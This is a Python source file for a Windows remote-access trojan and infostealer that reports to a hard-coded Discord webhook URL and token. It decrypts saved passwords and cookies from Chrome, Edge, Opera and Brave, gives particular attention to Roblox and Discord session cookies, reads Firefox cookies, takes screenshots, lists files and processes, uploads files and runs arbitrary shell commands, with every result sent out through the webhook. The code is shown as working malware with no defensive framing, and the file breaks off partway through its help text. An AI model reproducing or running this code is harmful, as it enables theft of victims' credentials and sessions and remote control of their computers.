import os
import sys
import json
import time
import socket
import platform
import subprocess
import requests
import psutil
import uuid
import base64
import io
import sqlite3
import shutil
import re
import random
import string
from PIL import ImageGrab
from datetime import datetime
from pathlib import Path
from Crypto.Cipher import AES
from win32crypt import CryptUnprotectData

# Configuration
WEBHOOK_URL = "https://discord.com/api/webhooks/1373461352315621428/w_EW9tlBdcuF-BlKrn88pdBob3TY90CwV-N6SxmTBEUp5h2YzPTRJEz8O7VB58dTqDT6"
COMMAND_PREFIX = "!"  # Commands will start with this character
CHECK_INTERVAL = 5  # How often to check for new commands (in seconds)
AUTHORIZED_USERS = [  # Discord user IDs that are allowed to control this system
    ""
]

# ASCII Art for cool text display
ASCII_ART = """
"""

# Cool text formatting
def format_text(text, style="info"):
    styles = {
        "info": "🔵",
        "success": "✅",
        "warning": "⚠️",
        "error": "❌",
        "critical": "🚨",
        "system": "🖥️",
        "network": "🌐",
        "file": "📁",
        "download": "📥",
        "upload": "📤",
        "process": "⚙️",
        "user": "👤",
        "cookie": "🍪",
        "password": "🔑",
        "screenshot": "📸",
        "command": "🔄",
        "exit": "🔴"
    }
    
    prefix = styles.get(style, "ℹ️")
    return f"{prefix} {text}"

def send_message(content, style="info"):
    """Send a message to the Discord webhook with fancy formatting"""
    if style and not content.startswith(("```", "🔵", "✅", "⚠️", "❌", "🚨", "🖥️", "🌐", "📁", "📥", "📤", "⚙️", "👤", "🍪", "🔑", "📸", "🔄", "🔴")):
        content = format_text(content, style)
    
    data = {
        "content": content,
        "username": f"{platform.node()} Bot"
    }
    try:
        response = requests.post(WEBHOOK_URL, json=data)
        return response.status_code == 204
    except Exception as e:
        print(f"Error sending message: {e}")
        return False

def send_file(file_path=None, file_content=None, file_name=None, content_type=None, message=None):
    """Send a file to the Discord webhook with an optional message"""
    try:
        if file_path and os.path.exists(file_path):
            file_name = file_name or os.path.basename(file_path)
            with open(file_path, 'rb') as f:
                file_content = f.read()
        
        if not file_content:
            return False
            
        files = {
            'file': (file_name, file_content, content_type)
        }
        
        data = {
            'username': f"{platform.node()} Bot"
        }
        
        if message:
            data['content'] = message
        
        response = requests.post(WEBHOOK_URL, files=files, data=data)
        return response.status_code == 204
    except Exception as e:
        print(f"Error sending file: {e}")
        return False

def get_detailed_system_info():
    """Get detailed system information with fancy formatting"""
    try:
        # Basic system info
        info = {
            "Hostname": socket.gethostname(),
            "Machine": platform.machine(),
            "Platform": platform.platform(),
            "System": platform.system(),
            "Release": platform.release(),
            "Version": platform.version(),
            "Processor": platform.processor(),
            "Architecture": platform.architecture()[0],
            "MAC Address": ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) 
                                    for elements in range(0, 48, 8)][::-1]),
            "IP Address": socket.gethostbyname(socket.gethostname()),
            "Boot Time": datetime.fromtimestamp(psutil.boot_time()).strftime("%Y-%m-%d %H:%M:%S"),
            "Current Time": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        }
        
        # CPU info
        cpu_info = {
            "CPU Cores (Physical)": psutil.cpu_count(logical=False),
            "CPU Cores (Logical)": psutil.cpu_count(logical=True),
            "CPU Usage": f"{psutil.cpu_percent()}%"
        }
        
        # Memory info
        memory = psutil.virtual_memory()
        memory_info = {
            "Total Memory": f"{memory.total / (1024**3):.2f} GB",
            "Available Memory": f"{memory.available / (1024**3):.2f} GB",
            "Used Memory": f"{memory.used / (1024**3):.2f} GB",
            "Memory Usage": f"{memory.percent}%"
        }
        
        # Disk info
        disk_info = {}
        for i, disk in enumerate(psutil.disk_partitions()):
            usage = psutil.disk_usage(disk.mountpoint)
            disk_info[f"Disk {i+1} - {disk.device}"] = {
                "Mountpoint": disk.mountpoint,
                "File System": disk.fstype,
                "Total Size": f"{usage.total / (1024**3):.2f} GB",
                "Used": f"{usage.used / (1024**3):.2f} GB",
                "Free": f"{usage.free / (1024**3):.2f} GB",
                "Usage": f"{usage.percent}%"
            }
        
        # Network info
        network_info = {}
        for i, (interface, addresses) in enumerate(psutil.net_if_addrs().items()):
            network_info[f"Network {i+1} - {interface}"] = {}
            for address in addresses:
                if address.family == socket.AF_INET:
                    network_info[f"Network {i+1} - {interface}"]["IPv4"] = address.address
                elif address.family == socket.AF_INET6:
                    network_info[f"Network {i+1} - {interface}"]["IPv6"] = address.address
                elif address.family == psutil.AF_LINK:
                    network_info[f"Network {i+1} - {interface}"]["MAC"] = address.address
        
        # Format the output with fancy borders and sections
        output = "╔══════════════════════ SYSTEM INFORMATION ══════════════════════╗\n"
        for k, v in info.items():
            output += f"║ {k}: {v}\n"
        output += "╚═════════════════════════════════════════════════════════════════╝\n\n"
        
        output += "╔══════════════════════ CPU INFORMATION ═══════════════════════╗\n"
        for k, v in cpu_info.items():
            output += f"║ {k}: {v}\n"
        output += "╚═════════════════════════════════════════════════════════════════╝\n\n"
        
        output += "╔══════════════════════ MEMORY INFORMATION ════════════════════╗\n"
        for k, v in memory_info.items():
            output += f"║ {k}: {v}\n"
        output += "╚═════════════════════════════════════════════════════════════════╝\n\n"
        
        output += "╔══════════════════════ DISK INFORMATION ══════════════════════╗\n"
        for disk_name, disk_data in disk_info.items():
            output += f"║ {disk_name}\n"
            for k, v in disk_data.items():
                output += f"║   {k}: {v}\n"
        output += "╚═════════════════════════════════════════════════════════════════╝\n\n"
        
        output += "╔══════════════════════ NETWORK INFORMATION ═══════════════════╗\n"
        for net_name, net_data in network_info.items():
            output += f"║ {net_name}\n"
            for k, v in net_data.items():
                output += f"║   {k}: {v}\n"
        output += "╚═════════════════════════════════════════════════════════════════╝"
        
        return output
    except Exception as e:
        return f"Error getting system info: {e}"

def take_screenshot():
    """Take a screenshot and return it as bytes"""
    try:
        screenshot = ImageGrab.grab()
        img_byte_arr = io.BytesIO()
        screenshot.save(img_byte_arr, format='PNG')
        return img_byte_arr.getvalue()
    except Exception as e:
        print(f"Error taking screenshot: {e}")
        return None

def list_processes():
    """List running processes with fancy formatting"""
    try:
        processes = []
        for proc in psutil.process_iter(['pid', 'name', 'username', 'memory_percent', 'cpu_percent']):
            try:
                proc_info = proc.info
                processes.append({
                    'pid': proc_info['pid'],
                    'name': proc_info['name'],
                    'username': proc_info['username'],
                    'memory_percent': f"{proc_info['memory_percent']:.2f}%",
                    'cpu_percent': f"{proc_info['cpu_percent']:.2f}%"
                })
            except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
                pass
        
        # Sort by memory usage
        processes.sort(key=lambda x: float(x['memory_percent'].strip('%')), reverse=True)
        
        # Format the output with fancy borders
        output = "╔═════════════════════════ RUNNING PROCESSES ════════════════════════╗\n"
        output += "║ PID\t\tMEM\t\tCPU\t\tUSER\t\tNAME\n"
        output += "╠═════════════════════════════════════════════════════════════════════╣\n"
        
        # Get top 25 processes
        for proc in processes[:25]:
            output += f"║ {proc['pid']}\t\t{proc['memory_percent']}\t{proc['cpu_percent']}\t{proc['username']}\t{proc['name']}\n"
        
        output += "╚═════════════════════════════════════════════════════════════════════╝"
        return output
    except Exception as e:
        return f"Error listing processes: {e}"

def list_directory(path="."):
    """List files in a directory with fancy formatting"""
    try:
        if not os.path.exists(path):
            return f"Path does not exist: {path}"
        
        if not os.path.isdir(path):
            return f"Path is not a directory: {path}"
        
        files = os.listdir(path)
        output = f"╔═══════════════════ DIRECTORY: {os.path.abspath(path)} ═══════════════════╗\n\n"
        
        # Get file details
        file_details = []
        for file in files:
            full_path = os.path.join(path, file)
            try:
                stats = os.stat(full_path)
                size = stats.st_size
                modified = datetime.fromtimestamp(stats.st_mtime).strftime("%Y-%m-%d %H:%M:%S")
                file_type = "📁 DIR" if os.path.isdir(full_path) else "📄 FILE"
                
                # Format size
                if size < 1024:
                    size_str = f"{size} B"
                elif size < 1024**2:
                    size_str = f"{size/1024:.2f} KB"
                elif size < 1024**3:
                    size_str = f"{size/(1024**2):.2f} MB"
                else:
                    size_str = f"{size/(1024**3):.2f} GB"
                
                file_details.append({
                    'name': file,
                    'type': file_type,
                    'size': size_str,
                    'modified': modified,
                    'raw_size': size  # For sorting
                })
            except Exception:
                file_details.append({
                    'name': file,
                    'type': "❌ ERROR",
                    'size': "N/A",
                    'modified': "N/A",
                    'raw_size': 0
                })
        
        # Sort by type (directories first) then by name
        file_details.sort(key=lambda x: (0 if "DIR" in x['type'] else 1, x['name'].lower()))
        
        # Format the output with fancy borders
        output += "║ TYPE\t\tSIZE\t\tMODIFIED\t\tNAME\n"
        output += "╠═════════════════════════════════════════════════════════════════════╣\n"
        
        for file in file_details:
            output += f"║ {file['type']}\t{file['size']}\t{file['modified']}\t{file['name']}\n"
        
        output += "╚═════════════════════════════════════════════════════════════════════╝"
        return output
    except Exception as e:
        return f"Error listing directory: {e}"

def execute_command(command):
    """Execute a system command and return the output"""
    try:
        result = subprocess.run(
            command, 
            shell=True, 
            capture_output=True, 
            text=True,
            timeout=30
        )
        output = result.stdout or result.stderr
        return output if output else "Command executed (no output)"
    except subprocess.TimeoutExpired:
        return "Command timed out after 30 seconds"
    except Exception as e:
        return f"Error executing command: {e}"

def get_browser_paths():
    """Get paths to browser data directories"""
    user_data_dir = os.path.expanduser('~')
    
    browser_paths = {
        "Chrome": {
            "cookies": os.path.join(user_data_dir, "AppData", "Local", "Google", "Chrome", "User Data", "Default", "Network", "Cookies"),
            "login_data": os.path.join(user_data_dir, "AppData", "Local", "Google", "Chrome", "User Data", "Default", "Login Data"),
            "local_state": os.path.join(user_data_dir, "AppData", "Local", "Google", "Chrome", "User Data", "Local State")
        },
        "Edge": {
            "cookies": os.path.join(user_data_dir, "AppData", "Local", "Microsoft", "Edge", "User Data", "Default", "Network", "Cookies"),
            "login_data": os.path.join(user_data_dir, "AppData", "Local", "Microsoft", "Edge", "User Data", "Default", "Login Data"),
            "local_state": os.path.join(user_data_dir, "AppData", "Local", "Microsoft", "Edge", "User Data", "Local State")
        },
        "Firefox": {
            "profile_dir": os.path.join(user_data_dir, "AppData", "Roaming", "Mozilla", "Firefox", "Profiles")
        },
        "Opera": {
            "cookies": os.path.join(user_data_dir, "AppData", "Roaming", "Opera Software", "Opera Stable", "Network", "Cookies"),
            "login_data": os.path.join(user_data_dir, "AppData", "Roaming", "Opera Software", "Opera Stable", "Login Data"),
            "local_state": os.path.join(user_data_dir, "AppData", "Roaming", "Opera Software", "Opera Stable", "Local State")
        },
        "Brave": {
            "cookies": os.path.join(user_data_dir, "AppData", "Local", "BraveSoftware", "Brave-Browser", "User Data", "Default", "Network", "Cookies"),
            "login_data": os.path.join(user_data_dir, "AppData", "Local", "BraveSoftware", "Brave-Browser", "User Data", "Default", "Login Data"),
            "local_state": os.path.join(user_data_dir, "AppData", "Local", "BraveSoftware", "Brave-Browser", "User Data", "Local State")
        }
    }
    
    return browser_paths

def get_chrome_encryption_key(local_state_path):
    """Get the encryption key used by Chrome-based browsers"""
    try:
        if not os.path.exists(local_state_path):
            return None
            
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = json.loads(f.read())
            
        # Get the encrypted key
        encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
        
        # Decrypt the key using Windows DPAPI
        decrypted_key = CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
        
        return decrypted_key
    except Exception as e:
        print(f"Error getting Chrome encryption key: {e}")
        return None

def decrypt_chrome_password(encrypted_password, encryption_key):
    """Decrypt a Chrome password"""
    try:
        # Get initialization vector
        iv = encrypted_password[3:15]
        
        # Get the encrypted password
        encrypted_password = encrypted_password[15:]
        
        # Create cipher
        cipher = AES.new(encryption_key, AES.MODE_GCM, iv)
        
        # Decrypt the password
        decrypted_password = cipher.decrypt(encrypted_password)[:-16].decode()
        
        return decrypted_password
    except Exception as e:
        print(f"Error decrypting Chrome password: {e}")
        return "(decryption failed)"

def extract_chrome_cookies(cookies_path, encryption_key, domains_of_interest=None):
    """Extract cookies from Chrome-based browsers"""
    cookies = []
    
    try:
        if not os.path.exists(cookies_path):
            return cookies
            
        # Create a temporary copy of the cookies database
        temp_dir = os.path.join(os.environ["TEMP"], "".join(random.choice(string.ascii_letters) for _ in range(10)))
        os.makedirs(temp_dir, exist_ok=True)
        temp_cookies_path = os.path.join(temp_dir, "Cookies")
        shutil.copy2(cookies_path, temp_cookies_path)
        
        # Connect to the database
        conn = sqlite3.connect(temp_cookies_path)
        cursor = conn.cursor()
        
        # Query for cookies
        if domains_of_interest:
            placeholders = ", ".join(["?" for _ in domains_of_interest])
            cursor.execute(
                f"SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies WHERE host_key LIKE ? OR host_key LIKE ?",
                ("%roblox%", "%discord%")
            )
        else:
            cursor.execute("SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies")
            
        for row in cursor.fetchall():
            host_key, name, path, encrypted_value, expires_utc = row
            
            # Decrypt the cookie value
            try:
                if encrypted_value[:3] == b'v10' or encrypted_value[:3] == b'v11':
                    decrypted_value = decrypt_chrome_password(encrypted_value, encryption_key)
                else:
                    # For older Chrome versions
                    decrypted_value = CryptUnprotectData(encrypted_value, None, None, None, 0)[1].decode()
            except:
                decrypted_value = "(decryption failed)"
                
            # Convert expires_utc to a readable date
            if expires_utc:
                # Chrome stores time as microseconds since Jan 1, 1601
                chrome_epoch = datetime(1601, 1, 1)
                expires_date = chrome_epoch + datetime.timedelta(microseconds=expires_utc)
                expires_str = expires_date.strftime("%Y-%m-%d %H:%M:%S")
            else:
                expires_str = "Session"
                
            cookies.append({
                "domain": host_key,
                "name": name,
                "path": path,
                "value": decrypted_value,
                "expires": expires_str
            })
            
        conn.close()
        
        # Clean up
        try:
            os.remove(temp_cookies_path)
            os.rmdir(temp_dir)
        except:
            pass
            
        return cookies
    except Exception as e:
        print(f"Error extracting Chrome cookies: {e}")
        return cookies

def extract_chrome_passwords(login_data_path, encryption_key):
    """Extract saved passwords from Chrome-based browsers"""
    passwords = []
    
    try:
        if not os.path.exists(login_data_path):
            return passwords
            
        # Create a temporary copy of the login database
        temp_dir = os.path.join(os.environ["TEMP"], "".join(random.choice(string.ascii_letters) for _ in range(10)))
        os.makedirs(temp_dir, exist_ok=True)
        temp_login_data_path = os.path.join(temp_dir, "Login Data")
        shutil.copy2(login_data_path, temp_login_data_path)
        
        # Connect to the database
        conn = sqlite3.connect(temp_login_data_path)
        cursor = conn.cursor()
        
        # Query for saved passwords
        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
            
        for row in cursor.fetchall():
            origin_url, username, encrypted_password = row
            
            # Decrypt the password
            try:
                if encrypted_password[:3] == b'v10' or encrypted_password[:3] == b'v11':
                    decrypted_password = decrypt_chrome_password(encrypted_password, encryption_key)
                else:
                    # For older Chrome versions
                    decrypted_password = CryptUnprotectData(encrypted_password, None, None, None, 0)[1].decode()
            except:
                decrypted_password = "(decryption failed)"
                
            passwords.append({
                "url": origin_url,
                "username": username,
                "password": decrypted_password
            })
            
        conn.close()
        
        # Clean up
        try:
            os.remove(temp_login_data_path)
            os.rmdir(temp_dir)
        except:
            pass
            
        return passwords
    except Exception as e:
        print(f"Error extracting Chrome passwords: {e}")
        return passwords

def extract_firefox_cookies():
    """Extract cookies from Firefox"""
    cookies = []
    
    try:
        browser_paths = get_browser_paths()
        firefox_profile_dir = browser_paths["Firefox"]["profile_dir"]
        
        if not os.path.exists(firefox_profile_dir):
            return cookies
            
        # Find the default profile
        profiles = [d for d in os.listdir(firefox_profile_dir) if os.path.isdir(os.path.join(firefox_profile_dir, d)) and d.endswith(".default")]
        
        if not profiles:
            return cookies
            
        # Get the cookies database
        cookies_path = os.path.join(firefox_profile_dir, profiles[0], "cookies.sqlite")
        
        if not os.path.exists(cookies_path):
            return cookies
            
        # Create a temporary copy of the cookies database
        temp_dir = os.path.join(os.environ["TEMP"], "".join(random.choice(string.ascii_letters) for _ in range(10)))
        os.makedirs(temp_dir, exist_ok=True)
        temp_cookies_path = os.path.join(temp_dir, "cookies.sqlite")
        shutil.copy2(cookies_path, temp_cookies_path)
        
        # Connect to the database
        conn = sqlite3.connect(temp_cookies_path)
        cursor = conn.cursor()
        
        # Query for cookies
        cursor.execute(
            "SELECT host, name, path, value, expiry FROM moz_cookies WHERE host LIKE ? OR host LIKE ?",
            ("%roblox%", "%discord%")
        )
            
        for row in cursor.fetchall():
            host, name, path, value, expiry = row
                
            # Convert expiry to a readable date
            if expiry:
                # Firefox stores time as seconds since Jan 1, 1970
                expires_date = datetime.fromtimestamp(expiry)
                expires_str = expires_date.strftime("%Y-%m-%d %H:%M:%S")
            else:
                expires_str = "Session"
                
            cookies.append({
                "domain": host,
                "name": name,
                "path": path,
                "value": value,
                "expires": expires_str
            })
            
        conn.close()
        
        # Clean up
        try:
            os.remove(temp_cookies_path)
            os.rmdir(temp_dir)
        except:
            pass
            
        return cookies
    except Exception as e:
        print(f"Error extracting Firefox cookies: {e}")
        return cookies

def extract_browser_data():
    """Extract browser data including cookies and saved passwords"""
    results = {
        "cookies": [],
        "passwords": []
    }
    
    try:
        browser_paths = get_browser_paths()
        domains_of_interest = ["roblox", "discord"]
        
        # Process Chrome
        if os.path.exists(browser_paths["Chrome"]["cookies"]):
            encryption_key = get_chrome_encryption_key(browser_paths["Chrome"]["local_state"])
            if encryption_key:
                chrome_cookies = extract_chrome_cookies(browser_paths["Chrome"]["cookies"], encryption_key, domains_of_interest)
                for cookie in chrome_cookies:
                    cookie["browser"] = "Chrome"
                    results["cookies"].append(cookie)
                
                chrome_passwords = extract_chrome_passwords(browser_paths["Chrome"]["login_data"], encryption_key)
                for password in chrome_passwords:
                    password["browser"] = "Chrome"
                    results["passwords"].append(password)
        
        # Process Edge
        if os.path.exists(browser_paths["Edge"]["cookies"]):
            encryption_key = get_chrome_encryption_key(browser_paths["Edge"]["local_state"])
            if encryption_key:
                edge_cookies = extract_chrome_cookies(browser_paths["Edge"]["cookies"], encryption_key, domains_of_interest)
                for cookie in edge_cookies:
                    cookie["browser"] = "Edge"
                    results["cookies"].append(cookie)
                
                edge_passwords = extract_chrome_passwords(browser_paths["Edge"]["login_data"], encryption_key)
                for password in edge_passwords:
                    password["browser"] = "Edge"
                    results["passwords"].append(password)
        
        # Process Opera
        if os.path.exists(browser_paths["Opera"]["cookies"]):
            encryption_key = get_chrome_encryption_key(browser_paths["Opera"]["local_state"])
            if encryption_key:
                opera_cookies = extract_chrome_cookies(browser_paths["Opera"]["cookies"], encryption_key, domains_of_interest)
                for cookie in opera_cookies:
                    cookie["browser"] = "Opera"
                    results["cookies"].append(cookie)
                
                opera_passwords = extract_chrome_passwords(browser_paths["Opera"]["login_data"], encryption_key)
                for password in opera_passwords:
                    password["browser"] = "Opera"
                    results["passwords"].append(password)
        
        # Process Brave
        if os.path.exists(browser_paths["Brave"]["cookies"]):
            encryption_key = get_chrome_encryption_key(browser_paths["Brave"]["local_state"])
            if encryption_key:
                brave_cookies = extract_chrome_cookies(browser_paths["Brave"]["cookies"], encryption_key, domains_of_interest)
                for cookie in brave_cookies:
                    cookie["browser"] = "Brave"
                    results["cookies"].append(cookie)
                
                brave_passwords = extract_chrome_passwords(browser_paths["Brave"]["login_data"], encryption_key)
                for password in brave_passwords:
                    password["browser"] = "Brave"
                    results["passwords"].append(password)
        
        # Process Firefox
        firefox_cookies = extract_firefox_cookies()
        for cookie in firefox_cookies:
            cookie["browser"] = "Firefox"
            results["cookies"].append(cookie)
        
        return results
    except Exception as e:
        print(f"Error extracting browser data: {e}")
        return results

def format_browser_data(browser_data):
    """Format browser data for display"""
    output = ""
    
    # Format cookies
    if browser_data["cookies"]:
        output += "╔═══════════════════════ BROWSER COOKIES ═══════════════════════╗\n"
        
        # Group cookies by domain
        domains = {}
        for cookie in browser_data["cookies"]:
            domain = cookie["domain"]
            if domain not in domains:
                domains[domain] = []
            domains[domain].append(cookie)
        
        # Format each domain
        for domain, cookies in domains.items():
            output += f"║ 🌐 Domain: {domain} ({len(cookies)} cookies)\n"
            output += "╠═════════════════════════════════════════════════════════════════════╣\n"
            
            for cookie in cookies:
                output += f"║ 🍪 {cookie['browser']} | Name: {cookie['name']}\n"
                output += f"║   Value: {cookie['value'][:30]}{'...' if len(cookie['value']) > 30 else ''}\n"
                output += f"║   Expires: {cookie['expires']}\n"
                output += "║   ---\n"
        
        output += "╚═════════════════════════════════════════════════════════════════════╝\n\n"
    else:
        output += "╔═══════════════════════ BROWSER COOKIES ═══════════════════════╗\n"
        output += "║ No cookies found for domains of interest\n"
        output += "╚═════════════════════════════════════════════════════════════════════╝\n\n"
    
    # Format passwords
    if browser_data["passwords"]:
        output += "╔═══════════════════════ SAVED PASSWORDS ═══════════════════════╗\n"
        
        # Group passwords by URL
        urls = {}
        for password in browser_data["passwords"]:
            url = password["url"]
            if url not in urls:
                urls[url] = []
            urls[url].append(password)
        
        # Format each URL
        for url, passwords in urls.items():
            output += f"║ 🌐 URL: {url}\n"
            output += "╠═════════════════════════════════════════════════════════════════════╣\n"
            
            for password in passwords:
                output += f"║ 🔑 {password['browser']} | Username: {password['username']}\n"
                output += f"║   Password: {password['password']}\n"
                output += "║   ---\n"
        
        output += "╚═════════════════════════════════════════════════════════════════════╝"
    else:
        output += "╔═══════════════════════ SAVED PASSWORDS ═══════════════════════╗\n"
        output += "║ No saved passwords found\n"
        output += "╚═════════════════════════════════════════════════════════════════════╝"
    
    return output

def get_last_message():
    """Get the last message from the webhook"""
    try:
        # This is a workaround since Discord webhooks don't have a direct way to read messages
        # In a real implementation, you would use a Discord bot with proper permissions
        # This is just a placeholder for demonstration purposes
        return None
    except Exception as e:
        print(f"Error getting last message: {e}")
        return None

def process_command(message):
    """Process a command from a Discord message"""
    if not message or not message.get("content", "").startswith(COMMAND_PREFIX):
        return
    
    # Check if user is authorized
    author_id = message.get("author", {}).get("id")
    if author_id not in AUTHORIZED_USERS:
        send_message("⛔ Unauthorized access attempt", "error")
        return
    
    # Parse the command
    full_command = message["content"][len(COMMAND_PREFIX):]
    command_parts = full_command.split(" ", 1)
    command_name = command_parts[0].lower()
    command_args = command_parts[1] if len(command_parts) > 1 else ""
    
    # Handle different commands
    if command_name == "info":
        system_info = get_detailed_system_info()
        # Split long outputs into multiple messages if needed
        if len(system_info) > 1900:
            chunks = [system_info[i:i+1900] for i in range(0, len(system_info), 1900)]
            for i, chunk in enumerate(chunks):
                send_message(f"```\nSystem Info ({i+1}/{len(chunks)}):\n{chunk}\n```", "system")
        else:
            send_message(f"```\n{system_info}\n```", "system")
    
    elif command_name == "screenshot":
        send_message("Taking screenshot...", "screenshot")
        screenshot_bytes = take_screenshot()
        if screenshot_bytes:
            send_file(file_content=screenshot_bytes, file_name="screenshot.png", content_type="image/png", message="📸 Here's the current screen")
        else:
            send_message("Failed to take screenshot", "error")
    
    elif command_name == "processes" or command_name == "ps":
        processes = list_processes()
        send_message(f"```\n{processes}\n```", "process")
    
    elif command_name == "ls" or command_name == "dir":
        path = command_args or "."
        directory_listing = list_directory(path)
        # Split long outputs into multiple messages if needed
        if len(directory_listing) > 1900:
            chunks = [directory_listing[i:i+1900] for i in range(0, len(directory_listing), 1900)]
            for i, chunk in enumerate(chunks):
                send_message(f"```\nDirectory Listing ({i+1}/{len(chunks)}):\n{chunk}\n```", "file")
        else:
            send_message(f"```\n{directory_listing}\n```", "file")
    
    elif command_name == "download":
        if not command_args:
            send_message("Please specify a file to download", "error")
            return
        
        file_path = command_args
        if not os.path.exists(file_path):
            send_message(f"File not found: {file_path}", "error")
            return
        
        if os.path.isdir(file_path):
            send_message(f"Cannot download a directory: {file_path}", "error")
            return
        
        file_size = os.path.getsize(file_path)
        if file_size > 8 * 1024 * 1024:  # Discord has an 8MB file size limit
            send_message(f"File too large to download: {file_size / (1024*1024):.2f} MB (max 8MB)", "error")
            return
        
        send_message(f"Downloading {file_path}...", "download")
        if send_file(file_path=file_path, message=f"📥 File: {os.path.basename(file_path)}"):
            send_message(f"File downloaded: {file_path}", "success")
        else:
            send_message(f"Failed to download file: {file_path}", "error")
    
    elif command_name == "cmd" or command_name == "shell":
        if not command_args:
            send_message("Please specify a command to execute", "error")
            return
        
        send_message(f"Executing: {command_args}", "command")
        output = execute_command(command_args)
        # Split long outputs into multiple messages if needed
        if len(output) > 1900:
            chunks = [output[i:i+1900] for i in range(0, len(output), 1900)]
            for i, chunk in enumerate(chunks):
                send_message(f"```\nOutput ({i+1}/{len(chunks)}):\n{chunk}\n```", "command")
        else:
            send_message(f"```\n{output}\n```", "command")
    
    elif command_name == "kill":
        if not command_args:
            send_message("Please specify a process ID to kill", "error")
            return
        
        try:
            pid = int(command_args)
            if psutil.pid_exists(pid):
                process = psutil.Process(pid)
                process_name = process.name()
                process.terminate()
                send_message(f"Process {pid} ({process_name}) terminated", "success")
            else:
                send_message(f"Process {pid} not found", "error")
        except ValueError:
            send_message("Invalid process ID", "error")
        except Exception as e:
            send_message(f"Error killing process: {e}", "error")
    
    elif command_name == "cd":
        try:
            path = command_args or "."
            os.chdir(path)
            send_message(f"Current directory: {os.getcwd()}", "file")
        except Exception as e:
            send_message(f"Error changing directory: {e}", "error")
    
    elif command_name == "pwd":
        send_message(f"Current directory: {os.getcwd()}", "file")
    
    elif command_name == "ping":
        send_message("Pong! I'm online.", "success")
    
    elif command_name == "uptime":
        boot_time = datetime.fromtimestamp(psutil.boot_time())
        uptime = datetime.now() - boot_time
        days, remainder = divmod(uptime.total_seconds(), 86400)
        hours, remainder = divmod(remainder, 3600)
        minutes, seconds = divmod(remainder, 60)
        uptime_str = f"{int(days)} days, {int(hours)} hours, {int(minutes)} minutes, {int(seconds)} seconds"
        send_message(f"System uptime: {uptime_str}", "system")
    
    elif command_name == "sysload":
        cpu_percent = psutil.cpu_percent(interval=1)
        memory = psutil.virtual_memory()
        disk = psutil.disk_usage('/')
        
        load_info = f"""
╔═══════════════════════ SYSTEM LOAD ═══════════════════════╗
║ CPU Usage: {cpu_percent}%
║ Memory Usage: {memory.percent}% ({memory.used / (1024**3):.2f} GB / {memory.total / (1024**3):.2f} GB)
║ Disk Usage: {disk.percent}% ({disk.used / (1024**3):.2f} GB / {disk.total / (1024**3):.2f} GB)
╚═════════════════════════════════════════════════════════════════════╝
        """
        send_message(f"```{load_info}```", "system")
    
    elif command_name == "netstat":
        try:
            connections = psutil.net_connections()
            output = "╔═══════════════════════ NETWORK CONNECTIONS ═══════════════════════╗\n"
            output += "║ Local Address\t\tRemote Address\t\tStatus\t\tPID\n"
            output += "╠═════════════════════════════════════════════════════════════════════╣\n"
            
            for conn in connections[:50]:  # Limit to 50 connections
                if conn.laddr and len(conn.laddr) >= 2:
                    laddr = f"{conn.laddr[0]}:{conn.laddr[1]}"
                else:
                    laddr = "N/A"
                
                if conn.raddr and len(conn.raddr) >= 2:
                    raddr = f"{conn.raddr[0]}:{conn.raddr[1]}"
                else:
                    raddr = "N/A"
                
                status = conn.status
                pid = conn.pid or "N/A"
                
                output += f"║ {laddr}\t{raddr}\t{status}\t{pid}\n"
            
            output += "╚═════════════════════════════════════════════════════════════════════╝"
            send_message(f"```\n{output}\n```", "network")
        except Exception as e:
            send_message(f"Error getting network connections: {e}", "error")
    
    elif command_name == "users":
        try:
            users = psutil.users()
            output = "╔═══════════════════════ LOGGED IN USERS ═══════════════════════╗\n"
            output += "║ Username\tTerminal\tHost\t\tStarted\n"
            output += "╠═════════════════════════════════════════════════════════════════════╣\n"
            
            for user in users:
                started = datetime.fromtimestamp(user.started).strftime("%Y-%m-%d %H:%M:%S")
                output += f"║ {user.name}\t{user.terminal}\t{user.host}\t{started}\n"
            
            output += "╚═════════════════════════════════════════════════════════════════════╝"
            send_message(f"```\n{output}\n```", "user")
        except Exception as e:
            send_message(f"Error getting user information: {e}", "error")
    
    elif command_name == "cookies":
        send_message("Searching for browser cookies...", "cookie")
        browser_data = extract_browser_data()
        
        # Filter for cookies only
        browser_data_cookies = {"cookies": browser_data["cookies"], "passwords": []}
        
        # Format and send the data
        formatted_data = format_browser_data(browser_data_cookies)
        
        # Split long outputs into multiple messages if needed
        if len(formatted_data) > 1900:
            chunks = [formatted_data[i:i+1900] for i in range(0, len(formatted_data), 1900)]
            for i, chunk in enumerate(chunks):
                send_message(f"```\nBrowser Cookies ({i+1}/{len(chunks)}):\n{chunk}\n```", "cookie")
        else:
            send_message(f"```\n{formatted_data}\n```", "cookie")
    
    elif command_name == "passwords":
        send_message("Searching for saved passwords...", "password")
        browser_data = extract_browser_data()
        
        # Filter for passwords only
        browser_data_passwords = {"cookies": [], "passwords": browser_data["passwords"]}
        
        # Format and send the data
        formatted_data = format_browser_data(browser_data_passwords)
        
        # Split long outputs into multiple messages if needed
        if len(formatted_data) > 1900:
            chunks = [formatted_data[i:i+1900] for i in range(0, len(formatted_data), 1900)]
            for i, chunk in enumerate(chunks):
                send_message(f"```\nSaved Passwords ({i+1}/{len(chunks)}):\n{chunk}\n```", "password")
        else:
            send_message(f"```\n{formatted_data}\n```", "password")
    
    elif command_name == "browser":
        send_message("Extracting all browser data...", "info")
        browser_data = extract_browser_data()
        
        # Format and send the data
        formatted_data = format_browser_data(browser_data)
        
        # Split long outputs into multiple messages if needed
        if len(formatted_data) > 1900:
            chunks = [formatted_data[i:i+1900] for i in range(0, len(formatted_data), 1900)]
            for i, chunk in enumerate(chunks):
                send_message(f"```\nBrowser Data ({i+1}/{len(chunks)}):\n{chunk}\n```", "info")
        else:
            send_message(f"```\n{formatted_data}\n```", "info")
    
    elif command_name == "help":
        help_text = """
╔═══════════════════════ AVAILABLE COMMANDS ═══════════════════════╗
║ !info - Display detailed system information
║ !screenshot - Take and send a screenshot
║ !processes (or !ps) - List running processes
║ !ls [path] - List files in directory (default: current directory)
║ !dir [path] - Same as ls
║ !download <file> - Download a file from the system
║ !cmd <command> - Execute a shell command
║ !shell <command> - Same as cmd
║ !kill <pid> - Terminate a process by ID
